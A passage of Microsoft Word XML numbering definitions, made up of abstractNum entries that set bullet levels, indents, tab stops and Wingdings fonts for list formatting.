      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="72EE80A0" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="EB20D5BC" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="165">
    <w:nsid w:val="5E8901F9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B0B214F2"/>
    <w:lvl w:ilvl="0" w:tplc="FE4E80D4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="EE1A00C4" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="C8120994" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="EBF6027A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="73EA5174" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="369C8894" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="08561496" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="0F8A7466" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="F95E4A06" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="166">
    <w:nsid w:val="5FB434EF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0820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09163C0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="EC589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60980043"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7FAA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60C072BB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9CB42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617101A0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="FBA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61746A75"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C320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61973350"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A16A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1CC1AEE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8B7A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nsid w:val="61EB35C5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0B7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2757DD5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6548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2AD5549"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C460318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nsid w:val="63E926D3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="65A8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40D0222"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="101A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nsid w:val="641C4EE4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8A2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424780B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="19EE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nsid w:val="642E0EBB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A8FE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64B40F08"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="947A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nsid w:val="66395F4D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="98F8F288"/>
    <w:lvl w:ilvl="0" w:tplc="D8FCEB52">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="5DF6444E" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="D12ADBE6" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="AA168E90" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="D706AAE8" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="22187CC6" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="3A1245F2" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="B5B2FCAA" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="889E9156" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="184">
    <w:nsid w:val="66767D95"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0A2A43A4"/>
    <w:lvl w:ilvl="0" w:tplc="4C78E5DE">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="F7B6CADA" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="A81E19F2" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="DFBE38CC" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="766A3728" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="582C1E82" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="A5727E20" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="024A2E3E" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="7D1C0CCA" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="185">
    <w:nsid w:val="67C36F2B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="38BE2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85F4BE2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CB68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nsid w:val="688A54EB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1888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8DF7497"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="21B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69650561"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="2926EDE0"/>
    <w:lvl w:ilvl="0" w:tplc="36C2012C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="5AD8A67E">
      <w:start w:val="4965"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="B8029766" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="D0FE39F0" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="260E570A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="6FA6D67E" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="4A82ECD0" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="715680E2" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="D0E6ABF2" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="190">
    <w:nsid w:val="6A8D772E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0868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ACE231C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2D60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B6A028F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A6DC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nsid w:val="6DE377F6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E1AA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nsid w:val="6E4E7090"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1472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nsid w:val="6F62624F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="90F6B3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6F805DFA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0D78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nsid w:val="70873635"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A830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nsid w:val="70FE1E1D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D6D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29346BA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3E3621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74925E48"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6AA2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nsid w:val="749846FC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E360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nsid w:val="74EB2DC6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7E50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776944F2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="53E4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nsid w:val="7787488D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="003A0640"/>
    <w:lvl w:ilvl="0" w:tplc="0E286210">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="7C94CB14">
      <w:start w:val="4580"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="53F0ACE8" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="EAE0483C" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="B7945D8E" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="7CFE8DEA" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="D6CABE02" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="0C4ABA02" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="93EA0908" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="205">
    <w:nsid w:val="784426DC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="032A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nsid w:val="786F1219"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D7A09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7AB07FC6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C254A340"/>
    <w:lvl w:ilvl="0" w:tplc="C58C2B3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7AEA418B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5118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7B8567E3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5BFAF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BA418FF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6030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D16059F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="85045954"/>
